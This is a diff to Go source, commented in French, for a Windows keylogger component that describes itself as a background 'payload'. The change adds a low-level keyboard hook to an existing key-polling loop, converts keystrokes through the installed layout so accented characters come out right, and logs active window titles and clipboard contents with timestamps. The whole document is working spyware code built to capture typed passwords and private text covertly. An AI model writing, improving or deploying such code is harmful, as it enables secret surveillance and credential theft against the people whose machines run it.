@@ -1,34 +1,50 @@
-// Capture clavier, presse-papiers et fenêtre active, plus captures d'écran.
+// Capture clavier, presse-papiers et fenêtre active.
 //
-// Le clavier est lu avec GetAsyncKeyState + ToUnicode : la conversion passe
-// par la disposition clavier réellement installée (AZERTY comprise) et par
-// l'état des touches de modification, donc les accents français sortent
-// correctement.
+// Deux mécanismes complémentaires :
+//
+//  1. un crochet bas niveau WH_KEYBOARD_LL — il voit chaque frappe, y compris
+//     celles des fenêtres qui ont le focus, sans jamais intercepter la
+//     touche (le crochet est passif) ;
+//  2. une boucle de sondage qui note la fenêtre active et le presse-papiers,
+//     et sert de repli si le crochet est refusé.
+//
+// La conversion passe par ToUnicodeEx et la disposition réellement installée
+// (AZERTY comprise), avec un état de modificateurs lu par GetAsyncKeyState —
+// GetKeyboardState ne convient pas depuis un fil sans file de messages.
 package main
 
 import (
 	"fmt"
 	"os"
+	"runtime"
 	"strings"
 	"sync"
+	"sync/atomic"
 	"syscall"
 	"time"
 	"unsafe"
 )
 
 var (
-	procGetAsyncKeyState = user32DLL.NewProc("GetAsyncKeyState")
-	procGetKeyboardState = user32DLL.NewProc("GetKeyboardState")
-	procMapVirtualKey    = user32DLL.NewProc("MapVirtualKeyW")
-	procToUnicode        = user32DLL.NewProc("ToUnicode")
-	procGetForegroundWin = user32DLL.NewProc("GetForegroundWindow")
-	procGetWindowTextW   = user32DLL.NewProc("GetWindowTextW")
-	procIsClipAvail      = user32DLL.NewProc("IsClipboardFormatAvailable")
-	procOpenClipboard    = user32DLL.NewProc("OpenClipboard")
-	procCloseClipboard   = user32DLL.NewProc("CloseClipboard")
-	procGetClipboardData = user32DLL.NewProc("GetClipboardData")
-	procGlobalLock       = kernel32DLL.NewProc("GlobalLock")
-	procGlobalUnlock     = kernel32DLL.NewProc("GlobalUnlock")
+	procGetAsyncKeyState  = user32DLL.NewProc("GetAsyncKeyState")
+	procMapVirtualKey     = user32DLL.NewProc("MapVirtualKeyW")
+	procToUnicodeEx       = user32DLL.NewProc("ToUnicodeEx")
+	procGetKeyboardLayout = user32DLL.NewProc("GetKeyboardLayout")
+	procGetForegroundWin  = user32DLL.NewProc("GetForegroundWindow")
+	procGetWindowTextW    = user32DLL.NewProc("GetWindowTextW")
+	procIsClipAvail       = user32DLL.NewProc("IsClipboardFormatAvailable")
+	procOpenClipboard     = user32DLL.NewProc("OpenClipboard")
+	procCloseClipboard    = user32DLL.NewProc("CloseClipboard")
+	procGetClipboardData  = user32DLL.NewProc("GetClipboardData")
+	procGlobalLock        = kernel32DLL.NewProc("GlobalLock")
+	procGlobalUnlock      = kernel32DLL.NewProc("GlobalUnlock")
+
+	procSetWindowsHookEx = user32DLL.NewProc("SetWindowsHookExW")
+	procCallNextHookEx   = user32DLL.NewProc("CallNextHookEx")
+	procUnhookWinHook    = user32DLL.NewProc("UnhookWindowsHookEx")
+	procGetMessageW      = user32DLL.NewProc("GetMessageW")
+	procTranslateMsg     = user32DLL.NewProc("TranslateMessage")
+	procDispatchMsg      = user32DLL.NewProc("DispatchMessageW")
 )
 
 const cfUnicodeText = 13
@@ -139,6 +155,37 @@ func specialKey(vk uintptr) (string, bool) {
 	return "", false
 }
 
+// keyboardState construit l'état clavier attendu par ToUnicodeEx.
+//
+// GetKeyboardState ne convient pas ici : il lit l'état du fil de la file de
+// messages, et ce fil n'en traite aucun (le payload tourne en tâche de fond),
+// donc l'état reste vide et ToUnicode échoue sur toutes les lettres
+// accentuées. On interroge donc chaque modificateur avec GetAsyncKeyState,
+// qui est global à la session.
+func keyboardState() []byte {
+	kb := make([]byte, 256)
+	for _, vk := range []uintptr{
+		0x10, 0xA0, 0xA1, // Maj
+		0x11, 0xA2, 0xA3, // Ctrl
+		0x12, 0xA4, 0xA5, // Alt
+		0x14,       // Verr. Maj (état bascule)
+		0x90, 0x91, // Verr. Num / Défil.
+	} {
+		cur, _, _ := procGetAsyncKeyState.Call(vk)
+		if vk == 0x14 {
+			// Bit 0 = bascule (allumé/éteint), pas l'appui.
+			if cur&0x0001 != 0 {
+				kb[vk] = 0x01
+			}
+			continue
+		}
+		if byte(cur>>8)&0x80 != 0 {
+			kb[vk] = 0x80
+		}
+	}
+	return kb
+}
+
 // vkToText convertit un code virtuel en texte, via la disposition réelle.
 func vkToText(vk uintptr) string {
 	if s, ok := specialKey(vk); ok {
@@ -150,15 +197,19 @@ func vkToText(vk uintptr) string {
 		return ""
 	}
 
-	kb := make([]byte, 256)
-	procGetKeyboardState.Call(uintptr(unsafe.Pointer(&kb[0])))
-
+	kb := keyboardState()
+	hkl, _, _ := procGetKeyboardLayout.Call(0)  // disposition du fil courant
 	scan, _, _ := procMapVirtualKey.Call(vk, 0) // MAPVK_VK_TO_VSC
+
 	buf := make([]uint16, 8)
-	r, _, _ := procToUnicode.Call(vk, scan, uintptr(unsafe.Pointer(&kb[0])),
-		uintptr(unsafe.Pointer(&buf[0])), uintptr(len(buf)), 0)
-	if r <= 0 {
-		// Touches non imprimables ou acc mort : on note le nom de la touche.
+	r, _, _ := procToUnicodeEx.Call(vk, scan, uintptr(unsafe.Pointer(&kb[0])),
+		uintptr(unsafe.Pointer(&buf[0])), uintptr(len(buf)), 0, hkl)
+	if int32(r) < 0 {
+		// Touche morte (accent circonflexe, tréma) : rien à écrire encore,
+		// la lettre suivante portera l'accent via ToUnicodeEx.
+		return ""
+	}
+	if r == 0 {
 		if vk >= 0x20 && vk <= 0x6E {
 			return fmt.Sprintf("[%s]", syscall.UTF16ToString([]uint16{uint16(vk)}))
 		}
@@ -173,15 +224,16 @@ func keyHeld(vk uintptr) bool {
 	return byte(cur>>8)&0x80 != 0
 }
 
-// keylogLoop tourne en continu : c'est le processus qui lit l'état des
-// touches, pas une tâche périodique. Chaque marque est horodatée et une
-// reprise après plus de 20 s d'inactivité ouvre une nouvelle ligne : sans
-// cela, le journal est un pavé illisible. Les raccourcis Ctrl/Alt sont
-// notés comme [CTRL+c] plutôt que par la lettre seule.
+// keylogLoop entretient deux choses : le crochet clavier (démarré une fois) et
+// le sondage de la fenêtre active et du presse-papiers. Quand le crochet est
+// actif, le sondage ne relit pas les touches : le crochet les voit toutes,
+// alors qu'un sondage à 30 ms en rate.
 func keylogLoop() {
+	go keyboardHookLoop()
+	time.Sleep(300 * time.Millisecond) // laisse le crochet s'installer
+
 	prev := make([]byte, 256)
 	first := true
-	var lastKey time.Time
 
 	for {
 		time.Sleep(30 * time.Millisecond)
@@ -197,47 +249,33 @@ func keylogLoop() {
 			klAppend("\n[win " + time.Now().Format("15:04:05") + "] " + t + "\n")
 		}
 
-		ctrl := keyHeld(0x11)
-		alt := keyHeld(0x12)
+		if !hookActive.Load() {
+			ctrl := keyHeld(0x11)
+			alt := keyHeld(0x12)
 
-		for vk := uintptr(1); vk < 256; vk++ {
-			cur, _, _ := procGetAsyncKeyState.Call(vk)
-			pressed := byte(cur>>8) & 0x80
-			if pressed == 0 {
-				prev[vk] = 0
-				continue
-			}
-			if prev[vk] != 0 { // maintenue : on n'écrit qu'au premier appui
-				continue
-			}
-			prev[vk] = pressed
-			if first {
-				// Premier tour : on ignore l'état déjà présent à l'ouverture,
-				// sinon la touche enfoncée au lancement part tout seule.
-				continue
-			}
-			if vk == 0x10 || vk == 0x11 || vk == 0x12 || vk == 0x14 || // shift/ctrl/alt/caps
-				vk == 0x90 || vk == 0x91 { // numlock / scrolllock
-				continue
-			}
-			if t := vkToText(vk); t != "" {
-				now := time.Now()
-				if lastKey.IsZero() || now.Sub(lastKey) > 20*time.Second {
-					klAppend("\n[" + now.Format("15:04:05") + "] ")
+			for vk := uintptr(1); vk < 256; vk++ {
+				cur, _, _ := procGetAsyncKeyState.Call(vk)
+				pressed := byte(cur>>8) & 0x80
+				if pressed == 0 {
+					prev[vk] = 0
+					continue
 				}
-				lastKey = now
-				if ctrl || alt {
-					mod := "CTRL"
-					if alt {
-						mod = "ALT"
-					}
-					klAppend("[" + mod + "+" + strings.Trim(t, "[]") + "]")
-				} else {
-					klAppend(t)
+				if prev[vk] != 0 { // maintenue : on n'écrit qu'au premier appui
+					continue
+				}
+				prev[vk] = pressed
+				if first {
+					// Premier tour : on ignore l'état déjà présent à
+					// l'ouverture, sinon la touche enfoncée au lancement part
+					// toute seule.
+					continue
+				}
+				if t := keyToText(vk, ctrl, alt); t != "" {
+					_ = t
 				}
 			}
+			first = false
 		}
-		first = false
 
 		// Presse-papiers : on note une seule fois chaque nouvelle valeur.
 		if c := clipboardText(); c != "" && c != klLastClip && len(c) < 4000 {
@@ -245,6 +283,114 @@ func keylogLoop() {
 			klAppend("\n[CLIP " + time.Now().Format("15:04:05") + "] " +
 				strings.ReplaceAll(c, "\r", "") + "\n")
 		}
+	}
+}
+
+// keyToText convertit et journalise une frappe, avec horodatage de reprise
+// après 20 s d'inactivité et notation des raccourcis Ctrl/Alt.
+func keyToText(vk uintptr, ctrl, alt bool) string {
+	switch vk {
+	case 0x10, 0x11, 0x12, 0x14, 0x90, 0x91, // Maj, Ctrl, Alt, Verr Maj/Num
+		0xA0, 0xA1, 0xA2, 0xA3, 0xA4, 0xA5: // Maj/Ctrl/Alt gauche et droite
+		return ""
+	}
+	t := vkToText(vk)
+	if t == "" {
+		return ""
+	}
+	now := time.Now()
+	keyMu.Lock()
+	if klLastKeyAt.IsZero() || now.Sub(klLastKeyAt) > 20*time.Second {
+		klAppend("\n[" + now.Format("15:04:05") + "] ")
+	}
+	klLastKeyAt = now
+	keyMu.Unlock()
+
+	if ctrl || alt {
+		mod := "CTRL"
+		if alt {
+			mod = "ALT"
+		}
+		klAppend("[" + mod + "+" + strings.Trim(t, "[]") + "]")
+	} else {
+		klAppend(t)
+	}
+	return t
+}
+
+/* ------------------------------------------------------------------ */
+/* Crochet clavier bas niveau (WH_KEYBOARD_LL)                         */
+/* ------------------------------------------------------------------ */
+
+const (
+	whKeyboardLL = 13
+	wmKeyDown    = 0x0100
+	wmSysKeyDown = 0x0104
+)
+
+type kbdLLHookStruct struct {
+	VKCode    uint32
+	ScanCode  uint32
+	Flags     uint32
+	Time      uint32
+	ExtraInfo uintptr
+}
+
+// winMsg reproduit la structure MSG (48 octets en 64 bits).
+type winMsg struct {
+	hwnd     uintptr
+	message  uint32
+	_        uint32
+	wParam   uintptr
+	lParam   uintptr
+	time     uint32
+	ptX      int32
+	ptY      int32
+	lPrivate uint32
+}
+
+var (
+	hookCallback uintptr // gardé en vie : le GC ne doit pas le récupérer
+	hookActive   atomic.Bool
+	keyMu        sync.Mutex
+	klLastKeyAt  time.Time
+)
+
+// keyboardHookLoop installe le crochet et pompe la file de messages du fil.
+// Le crochet est passif : il observe, ne bloque aucune touche, et n'exige pas
+// de privilège particulier.
+func keyboardHookLoop() {
+	runtime.LockOSThread()
+	defer runtime.UnlockOSThread()
+
+	hookCallback = syscall.NewCallback(func(nCode, wParam, lParam uintptr) uintptr {
+		if int32(nCode) >= 0 && (wParam == wmKeyDown || wParam == wmSysKeyDown) {
+			k := (*kbdLLHookStruct)(uptr(lParam))
+			keyToText(uintptr(k.VKCode), keyHeld(0x11), keyHeld(0x12))
+		}
+		r, _, _ := procCallNextHookEx.Call(0, nCode, wParam, lParam)
+		return r
+	})
+
+	h, _, err := procSetWindowsHookEx.Call(whKeyboardLL, hookCallback, 0, 0)
+	if h == 0 {
+		plog("clavier: crochet refusé, repli sur le sondage (" + err.Error() + ")")
+		return
+	}
+	hookActive.Store(true)
+	defer func() {
+		hookActive.Store(false)
+		procUnhookWinHook.Call(h)
+	}()
+
+	var msg winMsg
+	for {
+		r, _, _ := procGetMessageW.Call(uintptr(unsafe.Pointer(&msg)), 0, 0, 0)
+		if int32(r) <= 0 {
+			return
+		}
+		procTranslateMsg.Call(uintptr(unsafe.Pointer(&msg)))
+		procDispatchMsg.Call(uintptr(unsafe.Pointer(&msg)))
 	}
 }
 
